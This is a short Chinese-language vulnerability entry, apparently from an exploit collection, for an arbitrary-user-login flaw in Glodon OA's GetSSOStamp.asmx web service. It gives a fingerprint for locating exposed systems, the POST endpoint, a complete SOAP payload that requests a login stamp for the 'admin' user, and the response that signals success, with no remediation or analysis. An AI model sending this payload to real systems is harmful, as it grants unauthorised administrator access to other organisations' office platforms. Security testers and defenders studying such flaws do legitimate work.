# 广联达OAGetSSOStamp.asmx任意用户登录漏洞

广联达OAGetSSOStamp.asmx任意用户登录 ｜ 其他 ｜ —
- **指纹**：`body="Services/Identification/login.ashx"`
- **请求**：`POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetStamp xmlns="http://tempuri.org/">
<usercode>admin</usercode>
</GetStamp>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 GetStamp